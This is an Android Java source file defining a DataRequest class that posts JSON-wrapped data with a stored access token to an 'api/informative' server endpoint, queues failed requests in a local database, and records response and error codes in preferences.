package com.inet.android.request;

import java.io.IOException;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.db.OperationWithRecordInDataBase;
import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.db.RequestWithDataBase;
import com.inet.android.utils.Logging;

/**
 * Data request class
 * 
 * @author johny homicide
 * 
 */
public class DataRequest extends DefaultRequest {
	private final String LOG_TAG = DataRequest.class.getSimpleName().toString();
	final private String additionURL = "api/informative";

	private final int type = 4;
	Context mContext;
	static RequestDataBaseHelper db;

	public DataRequest(Context ctx) {
		super(ctx);
		this.mContext = ctx;
	}

	@Override
	public void sendRequest(String request) {
		RequestTask mt = new RequestTask();
		mt.execute(request);
	}

	class RequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		Logging.doLog(LOG_TAG, "1: " + request, "1: " + request);
		if (!request.equals(" ") && !request.equals("")) {
			SharedPreferences sp = PreferenceManager
					.getDefaultSharedPreferences(mContext);
			JSONObject jsonObject = new JSONObject();
			JSONArray jsonArray = new JSONArray();
			String requestArray = null;
			try {
				jsonObject.put("key", System.currentTimeMillis());
				requestArray = "[" + request + "]";
				jsonArray = new JSONArray(requestArray);
				jsonObject.put("data", jsonArray);

				Logging.doLog(LOG_TAG, "jsonArray: " + jsonArray.toString(),
						jsonObject.toString());

			} catch (JSONException e1) {
				Logging.doLog(LOG_TAG, "json сломался", "json сломался");
				e1.printStackTrace();
			}

			String str = null;
			try {
				Logging.doLog(LOG_TAG,
						"do make.requestArray: " + jsonObject.toString() + " "
								+ sp.getString("access_second_token", " "),
						"do make.requestArray: " + jsonObject.toString() + " "
								+ sp.getString("access_second_token", " "));

				str = Caller.doMake(jsonObject.toString(),
						sp.getString("access_second_token", ""), additionURL,
						true, null, mContext);
			} catch (IOException e) {
				// Добавление в базу request
				e.printStackTrace();
				Logging.doLog(LOG_TAG, "IOException DataRequest",
						"IOException DataRequest");

			}
			if (str != null) {
				getRequestData(str);
			} else {
				Logging.doLog(LOG_TAG, "ответа от сервера нет",
						"ответа от сервера нет");
				// ---------- data request in base ------------------

				OperationWithRecordInDataBase.insertRecord(request, type, null,
						null, null, mContext);

			}
		} else {
			Logging.doLog(LOG_TAG, "request == null", "request == null");
		}
	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		JSONObject jsonObject = null;
		String str = null;
		try {
			jsonObject = new JSONObject(response);
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			str = null;
		}

		Editor ed = sp.edit();
		if (str != null) {
			ed.putString("code_data", str);
		} else {
			ed.putString("code_data", "");
		}

		if (str.equals("2")) {
			RequestList.sendPeriodicRequest(mContext);
		}

		if (str.equals("0")) {
			String errstr = null;
			try {
				errstr = jsonObject.getString("error");
			} catch (JSONException e) {
				errstr = null;
			}
			if (errstr != null) {
				ed.putString("error_data", errstr);
				ed.commit();

				if (errstr.equals("1")) {
					Logging.doLog(LOG_TAG, "device not found",
							"device not found");
				}
				if (errstr.equals("2"))
					Logging.doLog(LOG_TAG,
							"is not available for this operation",
							"is not available for this operation");
				if (errstr.equals("3"))
					Logging.doLog(LOG_TAG, "the wrong key", "the wrong key");
			} else {
				ed.putString("error_data", "");
			}
		}
		ed.commit();
	}

	@Override
	public void sendRequest(int request) {
		// TODO Auto-generated method stub

	}

}